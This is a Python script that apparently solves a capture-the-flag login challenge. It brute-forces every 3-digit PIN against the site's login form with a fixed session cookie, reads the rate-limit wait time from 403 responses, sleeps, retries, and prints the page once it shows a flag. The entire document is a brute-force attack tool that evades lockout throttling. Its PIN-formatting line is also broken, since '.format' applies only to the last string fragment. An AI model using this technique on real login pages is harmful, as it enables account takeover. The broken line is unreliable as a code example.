import re
import time
import requests

challenge_number = 104
cookie = "ph5laj0dcctcg9nd7oujdn1art"
highers_num = 999
digits = 3

for i in range(highers_num):

    pin = '{0:0' + str(digits) + '}'.format(i)
    request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login", data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})

    if(request.text.__contains__("403 Forbidden")):
        print("Waiting " + re.search("\d+(?=<\/span> seconds)", request.text).group(0) + " seconds")
        time.sleep(int(re.search("\d+(?=<\/span> seconds)", request.text).group(0)) + 1)
        request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login",
                                data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})

    print(pin)

    if(request.text.__contains__("FLAG")):
        print(request.text)
        print(pin)
        exit(-1)
